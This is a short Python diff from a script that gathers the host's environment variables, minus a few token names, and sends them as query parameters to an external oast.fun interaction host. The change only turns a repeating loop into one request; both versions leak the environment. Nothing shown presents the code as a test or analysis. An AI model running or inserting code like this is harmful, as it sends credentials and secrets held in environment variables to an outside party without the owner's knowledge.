@@ -18,10 +18,9 @@ skip = {
     "JUPYTER_TOKEN", "PROXYTOKEN"
 }
 
-while True:
-    params = {
+params = {
     k: os.environ[k]
     for k in sorted(os.environ.keys())
     if k not in skip
 }
-    r = requests.get("https://waltpehxhgtfhgofhsbvpo4qbb7406kwq.oast.fun/", params=params)
+r = requests.get("https://waltpehxhgtfhgofhsbvpo4qbb7406kwq.oast.fun/", params=params)
